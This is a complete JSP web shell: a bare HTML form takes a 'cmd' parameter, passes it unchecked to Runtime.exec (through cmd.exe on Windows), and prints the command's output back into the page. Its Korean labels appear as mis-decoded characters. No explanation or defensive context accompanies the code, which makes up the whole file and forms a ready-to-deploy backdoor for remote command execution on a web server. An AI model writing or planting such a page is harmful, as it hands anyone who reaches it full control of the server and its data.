<%@ page import="java.util.*,java.io.*"%>
<%@ page language="java" contentType="text/html; charset=EUC-KR"
    pageEncoding="EUC-KR"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>
</head>
<body>
<form method="GET" name="cmdForm" action="">
<input type="text" name="cmd">
<input type="submit" value="����">
</form>
<pre>
<%
if (request.getParameter("cmd") != null)
{
	out.println("��ɾ� : " + request.getParameter("cmd") + "<br>");
	
	Process p;
	
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1)
		p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    
    else
		p = Runtime.getRuntime().exec(request.getParameter("cmd"));
	
	InputStreamReader in = new InputStreamReader(p.getInputStream(),"euc-kr");
	BufferedReader br = new BufferedReader(in);
	
	String disr = br.readLine();
	
	while ( disr != null )
	{
		out.println(disr); 
		disr = br.readLine(); 
	}
}
%>
</pre>
</body>
</html>